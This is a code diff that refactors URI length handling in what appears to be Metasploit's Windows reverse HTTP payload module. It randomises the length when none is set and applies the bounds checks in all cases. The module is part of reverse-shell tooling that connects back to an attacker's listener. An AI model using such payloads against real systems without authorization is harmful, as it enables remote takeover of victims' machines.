@@ -77,21 +77,19 @@ module Payload::Windows::ReverseHttp
     uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
     uri_req_len = datastore['HTTPStagerURILength'].to_i
 
-    if uri_req_len > 0
-
-      if uri_req_len > uri_max_len
-        raise ArgumentError, "Maximum HTTPStagerURILength is #{uri_max_len}"
-      end
-
-      if uri_req_len < 5
-        raise ArgumentError, "Minimum HTTPStagerURILength is 5"
-      end
-
-      return "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, uri_req_len)
+    if uri_req_len == 0
+      uri_req_len = 30 + rand(uri_max_len-30)
     end
 
-    # Generate a random 30+ byte URI
-    "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
+    if uri_req_len > uri_max_len
+      raise ArgumentError, "Maximum HTTPStagerURILength is #{uri_max_len}"
+    end
+
+    if uri_req_len < 5
+      raise ArgumentError, "Minimum HTTPStagerURILength is 5"
+    end
+
+    "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, uri_req_len)
   end
 
   #
